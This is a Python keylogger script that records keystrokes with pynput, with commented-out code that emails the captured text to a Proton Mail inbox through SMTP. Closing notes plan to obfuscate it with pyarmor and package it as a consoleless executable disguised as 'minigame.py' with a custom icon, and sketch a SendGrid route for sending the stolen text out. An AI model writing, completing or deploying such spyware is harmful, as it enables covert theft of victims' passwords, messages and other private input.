import smtplib
import ssl
from email.message import EmailMessage
from datetime import datetime
from pynput import keyboard

startTime = datetime.now().strftime("%Y/%m/%d %I:%M %p")
text = ""

def on_press(key):
    global text
    try:
        text += ('{0}'.format(key.char))
    except AttributeError:
        if key == keyboard.Key.esc:
            return False
        elif key == keyboard.Key.backspace:
            text = text[0:-1]
        elif key == keyboard.Key.space:
            text += " "
        elif key == keyboard.Key.enter:
            text += "\n"
        else:
            pass
            # text += ('[{0}]'.format(key))

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

print(text)

# endTime = datetime.now().strftime("%Y/%m/%d %I:%M %p")

# inbox_name = 'emailname@proton.me'
# inbox_pword = 'password'

# msg = EmailMessage()
# msg['Subject'] = f"[{startTime}] - [{endTime}]"
# msg['From'] = inbox_name
# msg['To'] = inbox_name
# msg.set_content(text)

# try:
#     with smtplib.SMTP("smtp.proton.me", 587) as s:
#         s.starttls()
#         s.login(inbox_name, inbox_pword)
#         s.send_message(msg)
# except:
#     print("failed")

'''
consider using env variables for passwords
pyarmor to obfuscate
sendgrid
pyinstaller --onefile --no-console -i <icon.ico> minigame.py
'''

'''
import sendgrid
from sendgrid.helpers.mail import Mail, Email, To, Content

# Your SendGrid API key
sg = sendgrid.SendGridAPIClient(api_key="YOUR_SENDGRID_API_KEY")

from_email = Email("your_email@example.com")
to_email = To("receiver_email@example.com")
subject = "Subject of the email"
content = Content("text/plain", "This is the body of the email.")

mail = Mail(from_email, to_email, subject, content)

# Send the email
response = sg.send(mail)

print(response.status_code)  # Prints the status code of the API response
print(response.body)         # Prints the response body (for debugging)
print(response.headers)      # Prints any response headers
'''